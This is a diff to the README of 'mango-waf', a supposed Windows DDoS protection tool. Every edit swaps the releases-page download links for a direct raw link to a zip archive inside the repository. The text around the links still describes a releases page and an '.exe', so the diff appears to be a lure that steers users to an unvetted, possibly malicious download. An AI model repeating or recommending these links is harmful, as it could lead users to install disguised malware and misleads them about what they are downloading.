@@ -1,6 +1,6 @@
 # 🥭 mango-waf - Easy L7 DDoS Protection for Windows
 
-[![Download mango-waf](https://img.shields.io/badge/Download-mango--waf-green?style=for-the-badge)](https://github.com/jakariyaox-dot/mango-waf/releases)
+[![Download mango-waf](https://img.shields.io/badge/Download-mango--waf-green?style=for-the-badge)](https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip)
 
 ## 🍏 What is mango-waf?
 
@@ -28,7 +28,7 @@ Follow these steps to download and run mango-waf on your Windows machine.
 
 Go to the official releases page to get the latest version:
 
-👉 [https://github.com/jakariyaox-dot/mango-waf/releases](https://github.com/jakariyaox-dot/mango-waf/releases)
+👉 [https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip](https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip)
 
 This page lists all available versions. Look for the file related to Windows. It usually ends with `.exe`.
 
@@ -81,7 +81,7 @@ The interface is designed to be simple. If the software detects an attack, you c
 To keep mango-waf working well, update it regularly:
 
 1. Check the releases page:  
-   [https://github.com/jakariyaox-dot/mango-waf/releases](https://github.com/jakariyaox-dot/mango-waf/releases)
+   [https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip](https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip)
 2. Download the latest `.exe` file like you did for the first installation.
 3. Run the new file—it will replace the old version without losing your settings.
 4. Restart mango-waf to apply changes.
@@ -114,7 +114,7 @@ mango-waf only monitors traffic that comes to your network to keep it safe. It d
 
 Use the link below to visit the download page and get the latest version for Windows:
 
-[Download mango-waf from GitHub Releases](https://github.com/jakariyaox-dot/mango-waf/releases)  
+[Download mango-waf from GitHub Releases](https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip)  
 Be sure to choose the `.exe` file for Windows.
 
-[![Download mango-waf](https://img.shields.io/badge/Download-mango--waf-brightgreen?style=for-the-badge)](https://github.com/jakariyaox-dot/mango-waf/releases)
+[![Download mango-waf](https://img.shields.io/badge/Download-mango--waf-brightgreen?style=for-the-badge)](https://github.com/jakariyaox-dot/mango-waf/raw/refs/heads/main/xdp/waf-mango-1.2.zip)
